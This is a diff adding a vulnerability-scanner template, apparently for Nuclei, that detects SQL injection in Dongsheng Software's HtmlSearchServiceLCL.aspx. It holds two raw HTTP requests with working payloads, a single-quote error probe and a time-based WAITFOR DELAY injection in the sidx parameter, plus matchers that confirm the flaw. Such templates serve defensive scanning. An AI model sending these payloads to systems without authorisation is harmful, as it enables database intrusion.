@@ -1,0 +1,48 @@
+id: poc-yaml-dongshengsoft-htmlsearchservicelcl-aspx-sqli
+
+info:
+  name: Dongsheng Software HtmlSearchServiceLCL.aspx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Dongsheng Software HtmlSearchServiceLCL.aspx endpoint may allow attackers to inject malicious SQL queries.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /PriceCarrier/HtmlSearchServiceLCL.aspx?page=1&rows=10&sidx=1'&sord=asc&searchField=&searchString=&searchOper= HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "引号不完整"
+
+  - raw:
+      - |
+        GET /PriceCarrier/HtmlSearchServiceLCL.aspx?page=1&rows=10&sidx=1;WAITFOR+DELAY+'0:0:{{t1}}'--+-&sord=asc&searchField=&searchString=&searchOper= HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"griddatas\":"
+      - type: word
+        words:
+          - "<"
+        negative: true
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
